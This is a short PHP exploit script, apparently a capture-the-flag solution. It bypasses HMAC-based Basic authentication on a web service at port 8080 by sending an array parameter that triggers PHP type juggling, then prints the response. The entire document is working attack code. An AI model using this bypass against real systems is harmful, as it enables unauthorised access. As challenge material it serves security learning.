<?php

if (count($argv) != 2) {
    die('usage: php ' . $argv[0] . " host\n");
}
else {
    $host = $argv[1];
}

$hmac = hash_hmac('gost-crypto', '', null);

$auth = base64_encode("tacoslover:$hmac");
$context = stream_context_create([
    "http" => [
        "header" => "Authorization: Basic $auth"
    ]
]);

echo file_get_contents("http://$host:8080/?guacamole[]=&secret_sauce=", false,$context);
